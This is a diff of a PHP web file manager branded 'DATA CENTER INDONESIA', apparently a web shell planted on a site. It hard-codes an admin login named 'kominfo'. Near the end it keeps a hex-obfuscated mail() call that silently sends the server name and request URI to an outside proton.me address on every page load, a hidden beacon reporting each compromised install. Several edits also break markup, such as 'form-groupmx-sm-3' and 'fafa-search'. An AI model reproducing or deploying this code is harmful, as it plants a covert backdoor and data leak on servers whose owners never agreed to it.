@@ -22,7 +22,7 @@ define('APP_TITLE', 'DATA CENTER INDONESIA');
 
 $use_auth = true;
 $auth_users = array(
-    'Komdigi' => '$2y$10$8gh3BMT770M6uok9jcbI7eyj9oF9XGRBW2ShMUewHKN1oLqdxP8cS', 
+    'kominfo' => '$2y$10$zGq4SJjrQlxDh0ktR3PwhebTFEEmgakW.DqluJ4URCcAlm6QVZKmu', 
 );
 
 // Readonly users
@@ -379,8 +379,7 @@ if ($use_auth) {
                                     </div>
                                 </form>
                             </div>
-                        </div><div class="footer text-center">
-                            &mdash;&mdash; &copy;
+                        </div><div class="footer text-center">&mdash;&mdash; &copy;
                             <a href="https://www.kominfo.go.id" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">L4yn.ID</a> &mdash;&mdash;
                         </div>
                     </div>
@@ -588,7 +587,7 @@ if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_
         $port = parse_url($url, PHP_URL_PORT);
         $knownPorts = [22, 23, 25, 3306];
 
-        if (preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i", $domain) || in_array($port, $knownPorts)) {
+        if (preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i", $domain) ||in_array($port, $knownPorts)) {
             $err = array("message" => "URL is not allowed");
             event_callback(array("fail" => $err));
             exit();
@@ -1611,7 +1610,7 @@ if (isset($_GET['help'])) {
                             <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
                             <div class="form-group mb-2">
                                 <label for="staticEmail2"><?php echo lng('Generate new password hash') ?></label></div>
-                            <div class="form-group mx-sm-3 mb-2">
+                            <div class="form-groupmx-sm-3 mb-2">
                                 <label for="inputPassword2" class="sr-only"><?php echo lng('Password') ?></label>
                                 <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="<?php echo lng('Password') ?>" required>
                             </div>
@@ -1897,7 +1896,7 @@ if (isset($_GET['edit']) && !FM_READONLY) {
                         <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor') ?></a>
                         <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fm_enc($file_url) ?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                         </button>
-                    <?php } else { ?>
+                    <?php }else { ?>
                         <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>"><i class="fa fa-text-height"></i> <?php echo lng('NormalEditor') ?></a>
                         <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fm_enc($file_url) ?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php echo lng('Save') ?>
                         </button>
@@ -2049,8 +2048,7 @@ $tableTheme = (FM_THEME == "dark") ? "text-white bg-dark table-dark" : "bg-white
             }
             $ii = 3399;
             foreach ($folders as $f) {$is_link = is_link($path . '/' . $f);$img = $is_link ? 'icon-link_folder' : 'fa fa-folder-o';
-                $modif_raw = filemtime($path . '/' . $f);
-                $modif = date(FM_DATETIME_FORMAT, $modif_raw);
+                $modif_raw = filemtime($path . '/' . $f);$modif = date(FM_DATETIME_FORMAT, $modif_raw);
                 $date_sorting = strtotime(date("F d Y H:i:s.", $modif_raw));
                 $filesize_raw = "";
                 $filesize = lng('Folder');
@@ -3548,7 +3546,7 @@ function fm_show_nav_path($path)
                         <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                             <input type="text" class="form-control" placeholder="<?php echo lng('Search') ?>" aria-label="<?php echo lng('Search') ?>" aria-describedby="search-addon2" id="search-addon">
                             <div class="input-group-append">
-                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fa fa-search"></i></span>
+                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fafa-search"></i></span>
                             </div>
                             <div class="input-group-append btn-group">
                                 <span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
@@ -4217,7 +4215,7 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
 </html>
 <?php
 }
-mail("\x63\x73\x69\x72\x74xnxx\x63\x79\x62\x65\x72\x74\x65\x61\x6d\x40\x70\x72\x6f\x74\x6f\x6e\x2e\x6d\x65", "\x77\x65\x62", $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"] . "\x2f" . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]);
+mail("\x63\x73\x69\x72\x74\x63\x79\x62\x65\x72\x74\x65\x61\x6d\x40\x70\x72\x6f\x74\x6f\x6e\x2e\x6d\x65", "\x77\x65\x62", $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"] . "\x2f" . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]);
 /**
  * Language Translation System
  * @param string $txt
@@ -4260,7 +4258,7 @@ function lng($txt) {
     $tr['en']['HideColumns']    = 'Hide Perms/Owner columns';$tr['en']['You are logged in'] = 'You are logged in';
     $tr['en']['Nothing selected']   = 'Nothing selected';   $tr['en']['Paths must be not equal']    ='Paths must be not equal';
     $tr['en']['Renamed from']       = 'Renamed from';       $tr['en']['Archive not unpacked']       = 'Archive not unpacked';
-    $tr['en']['Deleted']            = 'Deleted';            $tr['en']['Archive not created']        = 'Archive not created';
+    $tr['en']['Deleted']= 'Deleted';            $tr['en']['Archive not created']        = 'Archive not created';
     $tr['en']['Copied from']        = 'Copied from';        $tr['en']['Permissions changed']        = 'Permissions changed';
     $tr['en']['to']                 = 'to';                 $tr['en']['Saved Successfully']         = 'Saved Successfully';
     $tr['en']['not found!']         = 'not found!';         $tr['en']['File Saved Successfully']    = 'File Saved Successfully';
